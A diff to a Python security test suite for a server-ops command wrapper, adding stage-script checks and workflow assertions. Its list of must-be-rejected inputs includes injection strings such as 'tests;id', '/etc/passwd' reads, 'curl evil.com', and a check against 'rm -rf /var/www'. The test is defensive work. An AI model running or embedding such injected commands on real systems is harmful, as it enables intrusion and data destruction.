@@ -9,12 +9,14 @@ ROOT = Path(__file__).resolve().parents[2]
 WRAPPER = ROOT / "ops/server/ca-ops-command"
 BOOTSTRAP = ROOT / "ops/server/bootstrap.sh"
 UPGRADE = ROOT / "ops/server/upgrade.sh"
+ENABLE_WRITE = ROOT / "ops/server/enable-write.sh"
+STAGE_SCRIPT = ROOT / "ops/server/stage_commit.sh"
 WORKFLOW = ROOT / ".github/workflows/controlled-server-ops.yml"
 
 
 class ServerOpsSecurityTests(unittest.TestCase):
     def test_shell_syntax(self):
-        for script in (WRAPPER, BOOTSTRAP, UPGRADE):
+        for script in (WRAPPER, BOOTSTRAP, UPGRADE, ENABLE_WRITE, STAGE_SCRIPT):
             with self.subTest(script=script.name):
                 subprocess.run(["bash", "-n", str(script)], check=True)
 
@@ -24,6 +26,8 @@ class ServerOpsSecurityTests(unittest.TestCase):
             "tests;id", "test", "status\nwhoami", "deploy", "crawler-import",
             "feed-audit;id", "feed-audit --path /etc/passwd",
             "crawler-probe;curl evil.com", "release-check && id", "crawler-sync",
+            "stage", "stage 000", "stage " + "a"*39 + "Z",
+            "stage " + "f"*40 + ";id", "stage " + "e"*41,
         ):
             with self.subTest(command=command):
                 proc = subprocess.run(
@@ -48,6 +52,10 @@ class ServerOpsSecurityTests(unittest.TestCase):
         self.assertIn("StrictHostKeyChecking=yes", yaml_text)
         self.assertIn("ssh-keygen -F", yaml_text)
         self.assertIn("environment: careeragency-ops", yaml_text)
+        self.assertIn("startsWith(github.event.issue.title, 'CA-OPS: stage ')", yaml_text)
+        self.assertIn("inputs.operation == 'stage'", yaml_text)
+        self.assertIn("remote_command=stage %s", yaml_text)
+        self.assertIn("^[0-9a-f]{40}$", yaml_text)
 
     def test_forced_command_without_sudo(self):
         bootstrap = BOOTSTRAP.read_text()
@@ -67,6 +75,8 @@ class ServerOpsSecurityTests(unittest.TestCase):
         self.assertNotIn("--commit-test-db", wrapper)
         self.assertNotIn("psycopg", wrapper)
         self.assertNotIn("systemctl restart", wrapper)
+        self.assertIn("/usr/local/lib/careeragency-ops/stage_commit.sh", wrapper)
+        self.assertNotIn("rm -rf /var/www", wrapper)
         self.assertIn("expected_sha=1fdff1b1c17feb21332c83bce66bb262788eb370", wrapper)
         self.assertIn("git -C \"$workdir/repo\" rev-parse HEAD", wrapper)
         self.assertIn("timeout 60s python3 -m crawler.yousty_probe", wrapper)
